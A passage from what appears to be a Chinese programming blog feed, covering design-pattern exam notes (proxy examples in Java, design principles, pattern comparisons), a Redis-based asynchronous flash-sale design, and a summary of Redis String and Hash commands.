class_">ImageProxy</span> <span class="keyword">implements</span> <span class="title class_">Image</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> HighResolutionImage highResolutionImage;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ImageProxy</span><span class="params">(HighResolutionImage highResolutionImage)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.highResolutionImage = highResolutionImage;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showImage</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!highResolutionImage.isLoad())&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Temp Image: &quot;</span> + highResolutionImage.getWidth() + <span class="string">&quot;-&quot;</span> + highResolutionImage.getHeight());</span><br><span class="line">                Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        highResolutionImage.showImage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>)&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">image</span> <span class="operator">=</span> <span class="string">&quot;http://image.jpg&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(image);</span><br><span class="line">        <span class="type">HighResolutionImage</span> <span class="variable">highResolutionImage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HighResolutionImage</span>(url);</span><br><span class="line">        <span class="type">ImageProxy</span> <span class="variable">imageProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageProxy</span>(highResolutionImage);</span><br><span class="line">        imageProxy.showImage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="保护代理"><a href="#保护代理" class="headerlink" title="保护代理"></a>保护代理</h4><p>某论坛已注册用户和游客的权限不同，已注册用户拥有发帖、修改自己的注册信息等功能；游客只能看别人的帖子，没有其他权限。使用Proxy模式来设计。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/v2-2f7ce510cd811cf3b4b2efe2a5159be3_r.jpg" alt="img" style="zoom:50%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AbstractPermission</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyUserInfo</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewNote</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">publishNote</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyNote</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLevel</span><span class="params">(<span class="type">int</span> level)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RealPermission</span> <span class="keyword">implements</span> <span class="title class_">AbstractPermission</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyUserInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;修改用户信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewNote</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">publishNote</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;发布新帖&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyNote</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;修改帖子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLevel</span><span class="params">(<span class="type">int</span> level)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PermissionProxy</span> <span class="keyword">implements</span> <span class="title class_">AbstractPermission</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">RealPermission</span> <span class="variable">permission</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealPermission</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">level</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyUserInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == level) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;对不起，你没有权限&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> == level) &#123;</span><br><span class="line">            permission.modifyUserInfo();</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewNote</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查看帖子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">publishNote</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == level) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;对不起，你没有权限&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> == level) &#123;</span><br><span class="line">            permission.publishNote();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyNote</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == level) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;对不起，你没有权限&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> == level) &#123;</span><br><span class="line">            permission.modifyNote();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLevel</span><span class="params">(<span class="type">int</span> level)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.level = level;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102123020426.png" alt="image-20250102123020426"></p>
<h3 id="设计模式的七大原则"><a href="#设计模式的七大原则" class="headerlink" title="设计模式的七大原则"></a><strong>设计模式的七大原则</strong></h3><h4 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h4><table>
<thead>
<tr>
<th>标记</th>
<th>设计模式原则名称</th>
<th>英文</th>
<th>简单定义</th>
</tr>
</thead>
<tbody><tr>
<td>OCP</td>
<td>开闭原则</td>
<td>Open Closed Principle</td>
<td>对扩展开放，对修改关闭</td>
</tr>
<tr>
<td>SRP</td>
<td>单一职责原则</td>
<td>Single Responsibility Principle</td>
<td>一个类只负责一个功能领域中的相应职责</td>
</tr>
<tr>
<td>LSP</td>
<td>里氏代换原则</td>
<td>Liskov Substitution Principle</td>
<td>所有引用基类的地方必须能透明地使用其子类的对象</td>
</tr>
<tr>
<td>DIP</td>
<td>依赖倒转原则</td>
<td>Dependency Inversion Principle</td>
<td>依赖于抽象，不能依赖于具体实现</td>
</tr>
<tr>
<td>ISP</td>
<td>接口隔离原则</td>
<td>Interface Segregation Principle</td>
<td>类之间的依赖关系应该建立在最小的接口上</td>
</tr>
<tr>
<td>CARP</td>
<td>合成&#x2F;聚合复用原则</td>
<td>Composite&#x2F;Aggregate Reuse Principle</td>
<td>尽量使用合成&#x2F;聚合，而不是通过继承达到复用的目的</td>
</tr>
<tr>
<td>LOD</td>
<td>迪米特法则&#x2F;最少知识原则</td>
<td>Law of Demeter &#x2F; Least Knowledge Principle</td>
<td>一个软件实体应当尽可能少的与其他实体发生相互作用</td>
</tr>
<tr>
<td></td>
<td>好莱坞原则</td>
<td>Hollywood Principle</td>
<td>一种软件设计原则，其核心思想是 “Don’t call us, we’ll call you”，意思是低层组件不应该调用高层组件，而应该让高层组件来控制何时调用低层组件。这个原则用于减少系统中组件之间的依赖关系，提高模块的独立性和可重用性。</td>
</tr>
</tbody></table>
<h4 id="设计模式与设计原则"><a href="#设计模式与设计原则" class="headerlink" title="设计模式与设计原则"></a>设计模式与设计原则</h4><table>
<thead>
<tr>
<th align="center">模式名称</th>
<th align="center">相关的设计原则</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td align="center">策略模式</td>
<td align="center">开闭原则、依赖倒转原则</td>
<td>客户端需要了解所有策略类的作用，增加使用复杂性</td>
</tr>
<tr>
<td align="center">观察者模式</td>
<td align="center">迪米特法则、依赖倒转原则</td>
<td>可能引起链式反应，增加系统复杂度</td>
</tr>
<tr>
<td align="center">装饰模式</td>
<td align="center">开闭原则、合成复用原则、单一职责原则</td>
<td>可能生成大量小对象，增加系统复杂性</td>
</tr>
<tr>
<td align="center">工厂方法模式</td>
<td align="center">依赖倒转原则、开闭原则</td>
<td>增加类的数量，系统复杂度增加</td>
</tr>
<tr>
<td align="center">抽象工厂模式</td>
<td align="center">依赖倒转原则、开闭原则</td>
<td>新增产品族时需要修改工厂接口，违反开闭原则</td>
</tr>
<tr>
<td align="center">单例模式</td>
<td align="center">依赖倒转原则</td>
<td>可能导致过多依赖，全局状态增加系统耦合度</td>
</tr>
<tr>
<td align="center">命令模式</td>
<td align="center">依赖倒转原则、开闭原则</td>
<td>增加类的数量，系统复杂度增加</td>
</tr>
<tr>
<td align="center">适配器模式</td>
<td align="center">合成复用原则</td>
<td>可能导致系统过于复杂，引入不必要的类</td>
</tr>
<tr>
<td align="center">外观模式</td>
<td align="center">迪米特法则</td>
<td>不能很好地限制客户端直接访问子系统</td>
</tr>
<tr>
<td align="center">模板方法模式</td>
<td align="center">开闭原则、里氏代换原则</td>
<td>子类实现复杂，导致系统可读性降低</td>
</tr>
<tr>
<td align="center">迭代器模式</td>
<td align="center">单一职责原则、开闭原则</td>
<td>增加了类的数量，可能导致系统复杂性增加</td>
</tr>
<tr>
<td align="center">组合模式</td>
<td align="center">合成复用原则、里氏代换原则</td>
<td>复杂性较高，调试和维护难度较大</td>
</tr>
<tr>
<td align="center">状态模式</td>
<td align="center">开闭原则、单一职责原则</td>
<td>状态类数量增加，导致系统复杂度上升</td>
</tr>
<tr>
<td align="center">代理模式</td>
<td align="center">迪米特法则、开闭原则</td>
<td>增加类的数量，系统复杂度增加</td>
</tr>
</tbody></table>
<h3 id="其他题目"><a href="#其他题目" class="headerlink" title="其他题目"></a>其他题目</h3><h4 id="设计模式与类库有何不同"><a href="#设计模式与类库有何不同" class="headerlink" title="设计模式与类库有何不同?"></a>设计模式与类库有何不同?</h4><ol>
<li>定义和目的：</li>
</ol>
<ul>
<li>设计模式：<strong>设计模式是解决特定问题的通用、重复使用的解决方案框架。它们是在多个软件项目中经过验证的最佳实践，用于解决常见的设计问题或设计软件架构时的挑战</strong>。</li>
<li>类库：<strong>类库是一组封装了特定功能的类和接口的集合。这些库提供了实现特定任务</strong>（如图形处理、网络通信等）<strong>所需的具体实现，使开发人员可以避免从头开始编写代码。</strong></li>
</ul>
<ol start="2">
<li>抽象级别：</li>
</ol>
<ul>
<li><strong>设计模式工作在更高的抽象级别，它们提供了一种方法论，用于如何组织代码和模块</strong>以解决复杂问题。</li>
<li><strong>类库则是具体实现，提供了可以直接使用的代码</strong>，使得开发人员可以直接调用库中的类和方法来实现特定功能。</li>
</ul>
<ol start="3">
<li>通用性和适用范围：</li>
</ol>
<ul>
<li><strong>设计模式具有更高的通用性，适用于多种编程语言和项目。例如，单例模式、观察者模式等在不同语言和项目中都有广泛应用。</strong></li>
<li><strong>类库通常与特定的编程语言或平台绑定，例如Java的Spring框架，Python的NumPy库。</strong></li>
</ul>
<ol start="4">
<li>重用程度：</li>
</ol>
<ul>
<li><strong>设计模式重用的是思想和方法，而不是代码</strong>。它们需要开发人员根据具体项目的需求来实现。</li>
<li><strong>类库重用的是代码</strong>，开发人员可以通过调用库中的函数和对象来重用已实现的功能。</li>
</ul>
<p>总的来说，<strong>设计模式是一种在软件架构层面上解决问题的方法，而类库提供了具体的工具和功能</strong>，用于实现这些设计模式或完成其他特定的编程任务。设计模式关注的是如何设计软件的结构和交互，而类库提供了完成这些设计所需的具体实现工具。</p>
<h4 id="请解释设计模式如何对模型-视图-控制器（MVC）做出贡献"><a href="#请解释设计模式如何对模型-视图-控制器（MVC）做出贡献" class="headerlink" title="请解释设计模式如何对模型-视图-控制器（MVC）做出贡献?"></a>请解释设计模式如何对模型-视图-控制器（MVC）做出贡献?</h4><p>Model-View-Controller（MVC）是一种常用的软件设计架构，用于实现用户界面。它将应用程序分为三个主要部分：</p>
<ol>
<li><strong>模型（Model）：代表应用程序的核心功能和数据</strong>。它与数据存储直接交互，并包含与数据相关的逻辑。</li>
<li><strong>视图（View）：负责展示数据（模型）给用户。它是应用程序的用户界面。</strong></li>
<li><strong>控制器（Controller）：作为模型和视图之间的中介</strong>，控制器接收用户的输入，并调用模型和视图去执行相应的操作。</li>
</ol>
<p>设计模式如何促进MVC架构：</p>
<ol>
<li><strong>分离关注点（Separation of Concerns）：设计模式鼓励将不同的功能分离开来。在MVC中，模型、视图和控制器各自管理不同的责任</strong>，这使得应用程序更容易维护和扩展。</li>
<li>观察者模式：<strong>这是MVC中经常使用的一个模式。在这个模式中，视图作为观察者，当模型的状态改变时，会通知视图，以便视图可以更新自己</strong>。这种模式促进了模型和视图之间的低耦合。</li>
<li>策略模式：视图和控制器实现了经典的策略模式:视图是一个对象，可以被调整使用不同的策略，而控制器提供了策略。视图只关心系统中可视的部分，对于任何界面行为，都委托给控制器处理。使用策略模式也可以让视图和模型之间的关系解耦，因为控制器负责和模型交互来传递用户的请求。对于工作是怎么完成的，视图毫不知情。</li>
<li>工厂模式：用于创建对象，特别是当有多种类型的对象需要被创建时。在MVC架构中，<strong>工厂模式可以用来创建控制器或视图</strong>，特别是在复杂的应用程序中。</li>
<li>适配器模式：<strong>这个模式用于确保接口的兼容性，特别是在集成第三方库或服务时</strong>。在MVC中，它可以帮助确保模型、视图和控制器的不同部分可以无缝协作。</li>
<li>**组合模式：**显示包括了窗口、面板、按钮、文本标签等。每个显示组件如果不是组合节点(例如窗口)，就是叶节点(例如按钮)。当控制器告诉视图更新时，只需告诉视图最顶层的组件即可，组合会处理其余的事。</li>
</ol>
<h4 id="请写出与工厂方法模式有关的OO原则（至少三个）"><a href="#请写出与工厂方法模式有关的OO原则（至少三个）" class="headerlink" title="请写出与工厂方法模式有关的OO原则（至少三个）"></a>请写出与工厂方法模式有关的OO原则（至少三个）</h4><p>工厂方法模式是一种常用的设计模式，在面向对象编程中，它与多个面向对象设计原则紧密相关。以下是与工厂方法模式相关的至少三个面向对象原则：</p>
<ol>
<li><strong>单一职责原则（Single Responsibility Principle）：这个原则指出一个类应该只有一个引起变化的原因。在工厂方法模式中，创建对象的职责被分配给专门的工厂类，这样做可以将对象的创建和使用分离，每个工厂类只负责创建一种类型的对象。这符合单一职责原则，因为工厂类只关心对象的创建过程，而不关心对象的具体使用。</strong></li>
<li><strong>开闭原则（Open-Closed Principle）：这个原则表明软件实体（类、模块、函数等）应该对扩展开放，对修改关闭。工厂方法模式允许系统在不修改现有代码的情况下引入新类型的对象，因为创建对象的代码被封装在工厂类中。当需要创建新类型的对象时，我们可以通过添加新的工厂类来扩展系统，而无需修改现有的工厂类或客户端代码。</strong></li>
<li><strong>依赖倒置原则（Dependency Inversion Principle）：这个原则强调高层模块不应该依赖于低层模块，它们都应该依赖于抽象；抽象不应该依赖于细节，细节应该依赖于抽象。在工厂方法模式中，客户端代码依赖于抽象的工厂接口，而不是具体的工厂实现类。这样</strong>，客户端代码就可以与具体的产品类解耦，只依赖于产品接口。当需要更换或添加新的产品时，只需提供相应的工厂实现，无需修改客户端代码。</li>
</ol>
<p>这些原则共同构成了工厂方法模式的理论基础，帮助设计出灵活、可扩展且易于维护的系统。</p>
<h4 id="什么是设计模式？什么是design-pattern-catalog？"><a href="#什么是设计模式？什么是design-pattern-catalog？" class="headerlink" title="什么是设计模式？什么是design pattern catalog？"></a>什么是设计模式？什么是design pattern catalog？</h4><p><strong>设计模式是在软件工程中，针对特定问题的典型解决方案的一种标准化描述</strong>。它们是一套被广泛认可的最佳实践，可以用来解决在软件设计过程中经常出现的各种问题。设计模式不是可以直接转化成代码的模板，而是针对特定问题场景的一种指导方案。</p>
<p>设计模式通常包括以下几个方面：</p>
<ul>
<li>模式名称（Pattern Name）：一个便于记忆的名字，可以简洁地描述模式的本质。</li>
<li>问题（Problem）：描述了应该在何种情况下使用设计模式。</li>
<li>解决方案（Solution）：描述了设计的元素、它们之间的关系及各自的职责和协作方式，但不具体到特定的实现。</li>
<li>效果（Consequences）：描述了模式应用的效果及使用模式可能带来的权衡。</li>
</ul>
<p><strong>而“Design Pattern Catalog”是指收集多种设计模式的目录</strong>。它不仅包括每种设计模式的详细描述，还通常会涉及实际应用的示例和考虑应用某个模式时的优缺点。这个目录可以帮助开发人员在特定的设计问题上找到合适的模式，并理解其应用的背景和影响。</p>
<p><strong>设计模式通常被分为三大类：</strong></p>
<ol>
<li><strong>创建型模式（Creational Patterns）</strong>：这类模式与对象的创建有关，帮助使系统独立于如何创建、组合和表示对象。例如，<strong>单例模式、工厂方法模式、抽象工厂模式等。</strong></li>
<li><strong>结构型模式（Structural Patterns）</strong>：这类模式处理对象的组合，通常用于建立对象间的关系，使它们更易于管理和维护。例如，<strong>适配器模式、装饰器模式、代理模式，外观模式（Facade Pattern）等</strong>。</li>
<li><strong>行为型模式（Behavioral Patterns）</strong>：这类模式专注于对象间的责任分配。它们与对象之间的沟通、关系处理有关，有助于定义对象间的复杂控制流程。例如，<strong>观察者模式、策略模式、命令模式等。</strong></li>
</ol>
<p>这些模式提供了解决特定问题的框架，从而可以帮助开发者避免重复的工作，并提升代码的质量和可维护性。</p>
<h4 id="请比较策略和状态模式。"><a href="#请比较策略和状态模式。" class="headerlink" title="请比较策略和状态模式。"></a>请比较策略和状态模式。</h4><p>策略模式和状态模式是设计模式中常见的两种模式，它们都属于行为型模式，但各自的应用场景和目的有所不同。</p>
<ol>
<li><strong>策略模式（Strategy Pattern）</strong>：</li>
</ol>
<ul>
<li><p>目的：<strong>允许在运行时选择算法或行为</strong>。</p>
</li>
<li><p>应用场景：</p>
<ul>
<li>多种算法或行为：当你有<strong>多种类似的算法或行为，它们可以互换使用时</strong>。例如，不同的排序算法或税率计算。</li>
<li>算法独立于使用它们的客户端：策略模式<strong>允许在运行时切换算法</strong>，而不影响使用算法的代码。</li>
<li>避免条件语句：如果你的代码有许多条件语句来决定执行哪个算法，策略模式可以帮助你去除这些条件语句。</li>
<li>封装算法的变化：<strong>当算法的变化不应该影响到使用它们的代码时，使用策略模式可以封装这些变化。</strong></li>
</ul>
</li>
<li><p>实现方式：<strong>定义一个策略接口，然后创建实现此接口的具体策略类。上下文类则使用策略接口作为字段，通过该字段调用具体策略的方法。</strong></p>
</li>
<li><p>优点：<strong>提高了算法的复用性和灵活性，可以独立于使用它们的客户端变化。</strong></p>
</li>
<li><p>缺点：客户端必须了解不同策略之间的差异，增加了客户端的复杂性。</p>
</li>
</ul>
<ol start="2">
<li><strong>状态模式（State Pattern）</strong>：</li>
</ol>
<ul>
<li><p>目的：<strong>允许对象在内部状态改变时改变它的行为。</strong></p>
</li>
<li><p>应用场景：</p>
<ul>
<li>对象的行为依赖于其状态：<strong>当一个对象的行为随着其内部状态的改变而改变时，使用状态模式</strong>可以清晰地表示这种依赖关系。</li>
<li>复杂的状态逻辑：如果一个对象<strong>有复杂的状态逻辑，如多个条件语句决定状态的转换，状态模式可以帮助组织和管理这些逻辑。</strong></li>
<li>状态转换明确：当**存在明确的状态转换规则，**并且这些规则随时间变化时，状态模式可以使得状态转换更加清晰和可管理。</li>
<li>避免对象行为的膨胀：如果一个对象在不同状态下的行为有很大的差异，而这些行为用条件语句表示会使代码复杂难懂，状态模式可以有效地组织这些行为。</li>
</ul>
</li>
<li><p>实现方式：<strong>状态模式通过将每种状态封装成独立的类，并将状态转换的逻辑放在状态类内部来实现</strong>，从而使得状态和行为的变化更加透明和一致。</p>
</li>
<li><p>优点：<strong>将状态的逻辑分散到对应的状态类中，易于扩展新状态。</strong></p>
</li>
<li><p>缺点：<strong>可能会引入很多状态类，增加系统复杂度。</strong></p>
</li>
</ul>
<p><strong>比较</strong>：</p>
<ul>
<li>相似之处：<strong>两者都是通过封装算法或行为来使得它们可以在运行时更改，同时减少了对象间行为的耦合。</strong></li>
<li>不同之处：<strong>策略模式通常用于选择算法或行为的系列中的一个，而状态模式通常用于基于内部状态的场景，其行为随着状态的改变而改变。策略模式的策略通常是静态的，不会随着上下文改变而改变，而状态模式的状态可能随着上下文的变化而转移。</strong></li>
</ul>
<p>简而言之，<strong>策略模式侧重于算法的选择，状态模式侧重于对象状态的演变。</strong></p>
<h4 id="请比较适配器、外观和装饰器设计模式的意图和模式"><a href="#请比较适配器、外观和装饰器设计模式的意图和模式" class="headerlink" title="请比较适配器、外观和装饰器设计模式的意图和模式"></a>请比较适配器、外观和装饰器设计模式的意图和模式</h4><ol>
<li><strong>适配器模式（Adapter Pattern）</strong>:</li>
</ol>
<ul>
<li>意图：<strong>适配器模式的目的是将一个类的接口转换成客户端期望的另一个接口。适配器让原本接口不兼容的类可以一起工作</strong>。</li>
<li>应用场景：当你希望使用某个类，但其接口与其他代码不兼容时，你可以使用适配器模式。这<strong>在整合旧系统或使用第三方库时尤为常见。</strong></li>
</ul>
<ol start="2">
<li><strong>外观模式（Facade Pattern）</strong>:</li>
</ol>
<ul>
<li>意图：<strong>外观模式提供了一个统一的接口，用来访问子系统中的一群接口。外观定义了一个高层接口，使得子系统更容易使用。</strong></li>
<li>应用场景：<strong>当你有一个复杂的子系统，并想为子系统中的一组接口提供一个简单的接口时，可以使用外观模式。它常用于简化客户端和复杂系统之间的交互。</strong></li>
</ul>
<ol start="3">
<li><strong>装饰器模式（Decorator Pattern）</strong>:</li>
</ol>
<ul>
<li>意图：装饰器模式<strong>动态地给一个对象添加一些额外的职责。就增加功能来说，装饰器模式比生成子类更为灵活。</strong></li>
<li>应用场景：当你<strong>希望在不改变对象接口的前提下，增强或修改对象的行为</strong>时，可以使用装饰器模式。这种模式在动态地添加功能以及在运行时选择功能方面非常有效。</li>
</ul>
<p>总结来说，<strong>适配器模式主要用于使现有接口适应新的接口，外观模式用于简化复杂接口，而装饰器模式则用于在不改变接口的情况下增加对象的功能</strong>。每种模式在解决特定类型的设计问题方面都有其独特的优势。</p>
<h3 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h3><ol>
<li><p><a href="https://zhuanlan.zhihu.com/p/677641084">南京大学软件学院-2023-高级软件设计（研究生）期末复习参考 - 知乎</a></p>
</li>
<li><p><a href="https://eaglebear2002.github.io/28165/#more">高级软件设计-期末复习 | EagleBear2002 的博客</a></p>
</li>
<li><p>HeadFirst设计模式（中文版）</p>
</li>
<li><p><a href="https://refactoringguru.cn/design-patterns/">常用设计模式有哪些？</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>高级软件设计</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>高级软件设计</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马点评项目实战（六）——异步秒杀</title>
    <url>/2024/02/17/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E5%85%AD%EF%BC%89%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5%E7%A7%92%E6%9D%80/</url>
    <content><![CDATA[<h2 id="为何需要异步秒杀"><a href="#为何需要异步秒杀" class="headerlink" title="为何需要异步秒杀"></a>为何需要异步秒杀</h2><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217125102521.png" alt="image-20250217125102521" style="zoom:50%;" />

<p>该图是秒杀业务的部署图，按照顺序进行每个步骤，耗时为所有步骤之和，其中一些业务还需要访问mysql，导致整个流程缓慢，效率低。因此需要用到异步秒杀。</p>
<span id="more"></span>

<h2 id="异步秒杀"><a href="#异步秒杀" class="headerlink" title="异步秒杀"></a>异步秒杀</h2><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217125452906.png" alt="image-20250217125452906"></p>
<p>将判断库存与校验一人一单的工作让redis执行，如果符合条件，添加订单到阻塞队列，让异步程序再执行。</p>
<p>库存判断使用redis的string数据结构即可，而一人一单则使用set数据结构。同样，为保证redis业务的原子性，使用lua脚本。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250217130246059.png" alt="image-20250217130246059"></p>
<p>但是基于阻塞队列的异步秒杀存在以下两问题：</p>
<ul>
<li>内存限制问题：使用jdk的阻塞队列会消耗jvm内存，在高并发情况下可能导致内存溢出。而如果设置队列上限会导致超出的订单无法添加。</li>
<li>数据安全问题：如果服务宕机，会导致内存中的订单信息丢失。如用户下单付款后，但后台并没有订单数据，出现数据不一致情况。或者异步任务从队列中取出任务执行时，服务崩溃，那么任务就会丢失。</li>
</ul>
]]></content>
      <categories>
        <category>项目实战</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>redis</tag>
        <tag>黑马点评</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2025/02/21/%E9%BB%91%E9%A9%AC%E7%82%B9%E8%AF%84%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%88%E4%B9%9D%EF%BC%89%E2%80%94%E2%80%94%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="Redis数据结构"><a href="#Redis数据结构" class="headerlink" title="Redis数据结构"></a>Redis数据结构</h2><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>其value为字符串，根据字符串的格式不同，可以分为3类：</p>
<ul>
<li>string：普通字符串</li>
<li>int：整数类型，可以做自增、自减操作</li>
<li>float：浮点类型，可以做自增、自减操作</li>
</ul>
<p>不管哪种格式，底层都是字节数组形式存储，只不过编码方式不同。字符串类型的最大空间不超过512M。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250221172256436.png" alt="image-20250221172256436"></p>
<p>String类型常见命令：</p>
<ul>
<li>SET、GET、MSET、MGET </li>
<li>INCR：让一个整型的key自增1</li>
<li>INCRBY：让一个整型的key自增指定步长</li>
<li>INCRBYFLOAT：让一个浮点类型的数字自增指定步长</li>
<li>SETNX：添加一个String类型的键值对，前提是这个key不存在，否则不执行</li>
<li>SETEX：添加一个String类型的键值对，并且指定有效期</li>
</ul>
<p>项目中的应用：</p>
<ol>
<li>以 前缀“phone：“ + 手机号码 为key，存储验证码。</li>
<li>可以将java对象序列化为JSON字符串，然后存储到string中。</li>
<li>利用INCR命令实现全局唯一ID。</li>
</ol>
<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>hash类型，也叫散列，其value是一个无序字典，类似于hashmap结构。</p>
<p>如果使用string存储对象，当需要修改对象某个字段时很不方便，而hash结构可以将对象中的每个字段独立存储，可以针对单个字段做CRUD。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250221173025418.png" alt="image-20250221173025418"></p>
<p>Hash类型常见命令：</p>
<ul>
<li>HSET key field value：添加或修改field的值</li>
<li>HGET </li>
<li>HMSET、HMGET</li>
<li>HGETALL key：一次性获取key中的所有field和value</li>
<li>HKEYS：获取所有field</li>
<li>HVALS：获取所有value</li>
<li>HINCYBY</li>
<li>HSETNX：添加一个hash类型的key的filed值，前提是这个field不存在，否则不执行</li>
</ul>
<p>项目中的应用：</p>
<ol>
<li>存储用户信息</li>
</ol>
